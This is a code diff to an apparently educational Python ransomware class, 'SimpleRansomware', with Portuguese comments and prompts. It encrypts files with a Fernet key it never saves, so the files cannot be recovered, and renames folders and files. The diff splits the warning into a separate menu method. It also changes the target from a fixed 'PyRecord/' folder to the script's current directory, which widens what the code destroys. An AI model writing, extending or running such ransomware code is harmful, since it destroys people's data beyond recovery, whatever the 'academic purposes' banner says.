@@ -12,10 +12,9 @@ class SimpleRansomware:
         - Tome cuidado ao executa-lo pois mesmo não salva a chave sendo impossivel recuperar os arquivos
         - Pastas e arquivos seram renomeados junto com suas extenções
     """
-    def __init__(self):
-        self.folder = ''
-        self.path = None
-        self.key = Fernet.generate_key()
+    folder = ''
+    path = None
+    key = Fernet.generate_key()
 
     def wellcome(self):
         """ Menu inicial """
@@ -23,10 +22,17 @@ class SimpleRansomware:
         art.tprint('Ransomware', 'tarty6')
 
         print(f"{'_' * 13} Ferramenta destinada apenas para fims academicos! {'_' * 13}\n")
-        print("Cuidado:\n"
-              "Essa ferramneta não salva a chave para recuperar os arquivos, "
-              "os danos causados por ela são sua responsabilidade")
-        option = input("Deseja executar essa ferramenta no seu sistema?(y/n)\n").lower()
+        self.danger_menu()
+
+    def danger_menu(self):
+        print(
+            "Cuidado:\n"
+            "Essa ferramneta não salva a chave para recuperar os arquivos, "
+            "os danos causados por ela são sua responsabilidade"
+        )
+        option: str = input("Esse Script vai tornar inlegivel tudo que estiver em pastas na pasta do script."
+                            "Deseja executar essa ferramenta no seu sistema?(y/n)\n").lower()
+
         if option == 'y':
             self.start()
         else:
@@ -40,10 +46,10 @@ class SimpleRansomware:
             self.folder = folder
             self.check_files_in_forlder(folder)
 
-    def check_folders(self):
+    def check_folders(self) -> list:
         """ Verifica as subpastas na pasta raiz indicada """
         folders = []
-        self.path = Path('PyRecord/')
+        self.path = Path()
 
         for item in self.path.iterdir():
             if item.is_dir():
